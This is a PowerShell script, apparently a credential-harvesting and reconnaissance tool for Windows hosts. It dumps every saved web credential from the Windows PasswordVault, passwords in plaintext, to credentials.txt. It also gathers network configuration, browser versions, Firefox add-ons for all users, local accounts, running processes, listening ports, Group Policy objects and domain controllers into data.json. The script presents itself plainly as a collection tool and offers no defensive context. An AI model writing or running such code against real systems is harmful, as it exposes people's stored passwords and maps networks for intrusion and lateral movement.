# Function to read the IE/Edge password vault (Web Credentials portion of credential manager)

function Get-PasswordVaultCredentials {
    #initilize empty array
    $CRED_MANAGER_CREDS_LST = @()

    try
    {
        #Load the WinRT projection for the PasswordVault
        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $Script:vault =  new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
        
        $Results = $Script:vault.RetrieveAll()
        foreach($credentry in  $Results)
        {
                $credobject = $Script:vault.Retrieve( $credentry.Resource, $credentry.UserName )
                $obj = New-Object PSObject                
                Add-Member -inputObject $obj -memberType NoteProperty -name "Username" -value "$($credobject.UserName)"                  
                Add-Member -inputObject $obj -memberType NoteProperty -name "Hostname" -value "$($credobject.Resource)" # URI need to be sanitised
                Add-Member -inputObject $obj -memberType NoteProperty -name "Password" -value "$($credobject.Password)" 
                $CRED_MANAGER_CREDS_LST += $obj                
        }
    }
    catch
    {
        Write-Host "Failed to instantiate passwordvault class. $($_.InvocationInfo.PositionMessage)"
    }
    return $CRED_MANAGER_CREDS_LST
}

$TAB =  "    "

#Get network data
$IPCONFIG = ipconfig /all | ConvertTo-Json

#Get data from navigators (listed manually)
$NAVIGATOR = Get-Process -Name "msedge" | Select-Object -First 1 | Select-Object ProductVersion
$NAVIGATOR = '"' + "Microsoft Edge: $NAVIGATOR" + ", "
$NAVIGATOR2 = Get-Process -Name "firefox" | Select-Object -First 1 | Select-Object ProductVersion
$NAVIGATOR += "Firefox: $NAVIGATOR2" + '"'

#Firefox addons
function Getcred{
[CmdletBinding()]
param (
    [Switch]$EnablePermissions,
    [Switch]$EnableDefaultExtensions,
    [Switch]$OnlyCurrentUser
)

if ( $OnlyCurrentUser ) {

    if ( (whoami) -eq 'NT AUTHORITY\SYSTEM' ) {

        Write-Warning 'The current user is SYSTEM. This usually means no user is logged on to this computer.'
        Exit

    }
    
    $UserPaths = Get-Item '~'

} else {

    $UserPaths = Get-ChildItem -Directory -Path "$env:SystemDrive\Users"

}

Foreach ( $User in $UserPaths ) {

    # Get Profiles folder
    $ProfilesDir = $User.FullName + "\AppData\Roaming\Mozilla\Firefox\Profiles"

    # Skip this round of the loop if no Profiles folder is present
    if ( -Not (Test-Path $ProfilesDir) ) {

        Continue

    }

    Foreach ( $ExtensionFile in (Get-ChildItem -Path $ProfilesDir -File -Filter "extensions.json" -Recurse)) {

        $ExtensionDir = $ExtensionFile.DirectoryName
        
        # Get Firefox version - yes it is in the loop. Had to determine profile location.
        $FirefoxVersion = $null
        Foreach ( $Line in (Get-Content "$ExtensionDir\compatibility.ini" -ErrorAction SilentlyContinue) ) {

            if ( $Line.StartsWith("LastVersion") ) {

                # Split on = and _, then grab the first element
                $FirefoxVersion = ($Line -split "[=_]")[1]

            }

        }
        
        # Read extensions JSON file
        $ExtensionJson = (Get-Content $ExtensionFile.FullName | ConvertFrom-Json).Addons

        Foreach ( $Extension in $ExtensionJson ) {
                
            $Location = $Extension.Location

            # Skip default extensions
            if ( -Not $EnableDefaultExtensions ) {

                if ( "app-builtin", "app-system-defaults" -contains $Location ) {

                    Continue

                }

            }
            
            # Convert InstallDate
            $InstallTime = [Double]$Extension.InstallDate
            # Divide by 1,000 because we are going to add seconds on to the base date
            $InstallTime = $InstallTime / 1000
            $UtcTime = Get-Date -Date "1970-01-01 00:00:00"
            $UtcTime = $UtcTime.AddSeconds($InstallTime)
            $LocalTime = [System.TimeZoneInfo]::ConvertTimeFromUtc($UtcTime, (Get-TimeZone))
        
            $Output = [Ordered]@{
               # User         = [String]  $User
                Name         = [String]  $Extension.DefaultLocale.Name
               # Version      = [String]  $Extension.Version
               # Enabled      = [Bool]    $Extension.Active
               # InstallDate  = [DateTime]$LocalTime
               # Description  = [String]  $Extension.DefaultLocale.Description
               # ID           = [String]  $Extension.Id
               # FirefoxVer   = [String]  $FirefoxVersion
               # Visible      = [Bool]    $Extension.Visible
               # AppDisabled  = [Bool]    $Extension.AppDisabled
               # UserDisabled = [Bool]    $Extension.UserDisabled
               # Hidden       = [Bool]    $Extension.Hidden
               # Location     = [String]  $Location
               # SourceUri    = [String]  $Extension.SourceUri
            }

            if ( $EnablePermissions ) {

                # Convert Permissions array into a multi-line string
                # This multi-line string is kind of ugly in Inventory, so it's disabled by default
                $Output.Permissions = [String]($Extension.UserPermissions.Permissions -Join "`n")

            }

            [PSCustomObject]$Output
        
        }

    }

}
}
$ADDONS = Getcred
$ADDONS = '"' + "$ADDONS" + '"'
$ADDONS = $ADDONS -replace [environment]::NewLine, " "

#Get data on local users
$USERS = Get-LocalUser | Select-Object Name, Enabled | ConvertTo-Json

#Get all active process
$ALLPROCESS = Get-Process | Select-Object ProcessName | ConvertTo-Json

#Get ports in listening mode
$PORTS = Get-NetTcpConnection -State Listen | Select-Object LocalPort| Sort-Object -Property LocalPort | ConvertTo-Json

#Get the OS
$OSV = [Environment]::OSVersion | Select-Object VersionString
$OSV = '"' + "$OSV" + '"'

#Get the GPO
$GPO = Get-GPO -All | Select DisplayName,Id,Description | ConvertTo-Json
if (-not $?)
{
	$GPO = '""'
}

#Get the Domaine Controler
$DC = Get-ADDomainController -Filter * | Select Name,IPv4Address | ConvertTo-Json
if (-not $?)
{
	$DC = '""'
}

#Create the JSON
$OUT = "{`n"
$OUT += "$TAB" + '"Net": ' + "$IPCONFIG" + ",`n"
$OUT += "$TAB" + '"Navigateurs": ' + "$NAVIGATOR" + ",`n"
$OUT += "$TAB" + '"Firefox-addons": ' + "$ADDONS" + ",`n"
$OUT += "$TAB" + '"Logon": ' + "$USERS" + ",`n"
$OUT += "$TAB" + '"Process": ' + "$ALLPROCESS" + ",`n"
$OUT += "$TAB" + '"Ports listening to": ' + "$PORTS" + ",`n"
$OUT += "$TAB" + '"OS": ' + "$OSV" + ",`n"
$OUT += "$TAB" + '"GPO": ' + "$GPO" + ",`n"
$OUT += "$TAB" + '"CD": ' + "$DC" + "`n"
$OUT += "}"

#Write the JSON
$OUT > data.json

#Write the credentials
Get-PasswordVaultCredentials > credentials.txt
